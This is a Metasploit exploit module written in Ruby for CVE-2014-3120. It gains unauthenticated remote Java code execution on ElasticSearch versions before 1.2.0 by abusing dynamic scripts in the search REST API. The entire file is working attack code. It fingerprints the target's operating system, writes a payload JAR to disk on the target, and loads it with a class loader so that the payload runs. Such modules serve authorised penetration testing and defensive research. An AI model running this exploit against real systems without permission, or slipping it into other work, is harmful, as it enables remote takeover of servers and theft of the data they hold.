##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ElasticSearch Dynamic Script Arbitrary Java Execution',
      'Description'    => %q{
        This module exploits a remote command execution vulnerability in ElasticSearch,
        exploitable by default on ElasticSearch prior to 1.2.0. The bug is found in the
        REST API, which requires no authentication or authorization, where the search
        function allows dynamic scripts execution, and can be used for remote attackers
        to execute arbitrary Java code. This module has been tested successfully on
        ElasticSearch 1.1.1 on Ubuntu Server 12.04 and Windows XP SP3.
      },
      'Author'         =>
        [
          'Alex Brasetvik',     # Vulnerability discovery
          'Bouke van der Bijl', # Vulnerability discovery and PoC
          'juan vazquez'        # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2014-3120'],
          ['OSVDB', '106949'],
          ['EDB', '33370'],
          ['URL', 'http://bouk.co/blog/elasticsearch-rce/'],
          ['URL', 'https://www.found.no/foundation/elasticsearch-security/#staying-safe-while-developing-with-elasticsearch']
        ],
      'Platform'       => 'java',
      'Arch'           => ARCH_JAVA,
      'Targets'        =>
        [
          [ 'ElasticSearch 1.1.1 / Automatic', { } ]
        ],
      'DisclosureDate' => 'Dec 09 2013',
      'DefaultTarget' => 0))

      register_options(
        [
          Opt::RPORT(9200),
          OptString.new('TARGETURI', [ true, 'The path to the ElasticSearch REST API', "/"]),
          OptString.new("WritableDir", [ true, "A directory where we can write files (only for *nix environments)", "/tmp" ])
        ], self.class)
  end

  def check
    result = Exploit::CheckCode::Safe

    if vulnerable?
      result = Exploit::CheckCode::Vulnerable
    end

    result
  end

  def exploit
    print_status("#{peer} - Trying to execute arbitrary Java..")
    unless vulnerable?
      fail_with(Failure::Unknown, "#{peer} - Java has not been executed, aborting...")
    end

    print_status("#{peer} - Asking remote OS...")
    res = execute(java_os)
    result = parse_result(res)
    if result.nil?
      fail_with(Failure::Unknown, "#{peer} - Could not get remote OS...")
    else
      print_good("#{peer} - OS #{result} found")
    end

    jar_file = ""
    if result =~ /win/i
      print_status("#{peer} - Asking TEMP path")
      res = execute(java_tmp_dir)
      result = parse_result(res)
      if result.nil?
        fail_with(Failure::Unknown, "#{peer} - Could not get TEMP path...")
      else
        print_good("#{peer} - TEMP path found on #{result}")
      end
      jar_file = "#{result}#{rand_text_alpha(3 + rand(4))}.jar"
    else
      jar_file = File.join(datastore['WritableDir'], "#{rand_text_alpha(3 + rand(4))}.jar")
    end

    register_file_for_cleanup(jar_file)
    execute(java_payload(jar_file))
  end

  def vulnerable?
    addend_one = rand_text_numeric(rand(3) + 1).to_i
    addend_two = rand_text_numeric(rand(3) + 1).to_i
    sum = addend_one + addend_two

    java = java_sum([addend_one, addend_two])
    res = execute(java)
    result = parse_result(res)

    if result.nil?
      return false
    else
      result.to_i == sum
    end
  end

  def parse_result(res)
    unless res && res.code == 200 && res.body
      return nil
    end

    begin
      json = JSON.parse(res.body.to_s)
    rescue JSON::ParserError
      return nil
    end

    begin
      result = json['hits']['hits'][0]['fields']['msf_result'][0]
    rescue
      return nil
    end

    result
  end

  def java_sum(summands)
    source = <<-EOF
#{summands.join(" + ")}
    EOF

    source
  end

  def to_java_byte_array(str)
    buff = "byte[] buf = new byte[#{str.length}];\n"
    i = 0
    str.unpack('C*').each do |c|
      buff << "buf[#{i}] = #{c};\n"
      i = i + 1
    end

    buff
  end

  def java_os
    "System.getProperty(\"os.name\")"
  end

  def java_tmp_dir
    "System.getProperty(\"java.io.tmpdir\");"
  end


  def java_payload(file_name)
    source = <<-EOF
import java.io.*;
import java.lang.*;
import java.net.*;

#{to_java_byte_array(payload.encoded_jar.pack)}
File f = new File('#{file_name.gsub(/\\/, "/")}');
FileOutputStream fs = new FileOutputStream(f);
bs = new BufferedOutputStream(fs);
bs.write(buf);
bs.close();
bs = null;
URL u = f.toURI().toURL();
URLClassLoader cl = new URLClassLoader(new java.net.URL[]{u});
Class c = cl.loadClass('metasploit.Payload');
c.main(null);
    EOF

    source
  end

  def execute(java)
    payload = {
      "size" => 1,
      "query" => {
        "filtered" => {
          "query" => {
            "match_all" => {}
          }
        }
      },
      "script_fields" => {
        "msf_result" => {
          "script" => java
        }
      }
    }

    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.path.to_s, "_search"),
      'method' => 'POST',
      'data'   => JSON.generate(payload)
    })

    return res
  end

end

